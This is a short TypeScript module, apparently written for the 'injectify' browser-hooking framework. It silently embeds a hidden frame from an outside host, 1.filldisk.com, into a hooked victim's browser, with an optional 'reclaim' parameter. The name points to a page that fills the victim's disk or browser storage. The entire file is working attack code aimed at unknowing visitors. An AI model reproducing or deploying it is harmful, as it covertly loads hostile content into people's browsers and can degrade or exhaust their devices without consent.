import Module from '../../definitions/module'
declare const { module, injectify } : Module

/**
 * Parse params
 */
var reclaim = ''
if (typeof module.params == 'object') {
    if (module.params.reclaim) reclaim = '?reclaim=true'
}

/**
 * Load the embed module
 */
injectify.module('embed', {
    url: `http://1.filldisk.com/frame.html${reclaim}`,
    hidden: true,
}).then(() => {
    module.return(true)
})